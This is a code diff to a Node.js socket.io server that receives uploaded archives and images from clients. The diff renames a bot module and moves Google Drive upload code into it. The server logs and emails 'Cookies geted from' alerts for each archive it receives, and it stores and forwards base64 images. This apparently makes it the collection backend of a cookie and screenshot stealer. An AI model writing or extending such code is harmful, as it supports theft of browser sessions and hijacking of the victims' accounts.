@@ -1,10 +1,9 @@
 const { Server } = require("socket.io");
 const fs = require("fs");
 const path = require("path");
-const {google} = require("googleapis");
 const http = require("http");
 const express = require("express");
-const bot = require("./bot/Bot.js");
+const meneger = require("./bot/Bot.js");
 
 const app = express();
 const server = http.createServer(app);
@@ -47,7 +46,7 @@ io.on('connection', (socket) => {
             fileStream.end();
             console.log("Архив получен");
             fileStream = null;
-            bot.sendmail("Cookies geted from " + headerName);
+            meneger.sendmail("Cookies geted from " + headerName);
         }
     });
 
@@ -56,24 +55,11 @@ io.on('connection', (socket) => {
         const imageBuffer = Buffer.from(base64Image, 'base64');
         fs.writeFile(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'), imageBuffer, err => {
             console.log("it will be uploaded");
-            const auth = new google.auth.GoogleAuth({
-                keyFile: path.join(__dirname,"secret","google.json"),
-                scopes: ['https://www.googleapis.com/auth/drive'],
-            });
-            const drive = google.drive({version: 'v3', auth});
-            const response = drive.files.create({
-                requestBody: {
-                    name: headers["name"] + getCurrentDate(),
-                    mimeType: 'image/jpg',
-                    parents: ['1HskEq4Ss7iKtpsuh8h9mp2zr1LqHALTw']
-                },
-                media: {
-                    mimeType: 'image/jpg',
-                    body: fs.createReadStream(path.join(__dirname,'static', 'Imeges', headers["name"] + '.jpg'))
-                }
-            });
-            console.log(response);
-            socket.emit('image_processed')
+            meneger.uploadIMG(headers["name"],getCurrentDate())
+                .then(() => {
+                    socket.emit('image_processed');
+                    console.log("Изображение загружено");
+                })
         });
     });
     socket.on('disconnect', () => {
